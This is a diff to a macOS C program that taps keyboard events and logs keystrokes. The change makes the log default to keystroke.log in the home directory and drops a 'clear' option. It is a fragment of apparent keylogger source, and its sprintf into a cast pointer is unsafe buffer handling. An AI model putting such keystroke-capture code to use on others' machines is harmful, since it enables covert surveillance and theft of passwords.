@@ -16,17 +16,15 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-    if(argc == 2) {
-        if(strcmp(argv[1], "clear") == 0) {
-            fopen(logfileLocation, "w");
-            printf("%s cleared.\n", logfileLocation);
-            fflush(stdout);
-            exit(1);
-        } else {
-            logfileLocation = argv[1];
-        }
+    if (argc == 1) {
+        sprintf((char*)logfileLocation, "%s/keystroke.log", getenv("HOME"));
+    } else if(argc == 2) {
+        sprintf((char*)logfileLocation, "%s", argv[1]);
+    } else {
+        printf("usage: %s [log_file]", argv[0]);
+        exit(1);
     }
-    
+
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
 
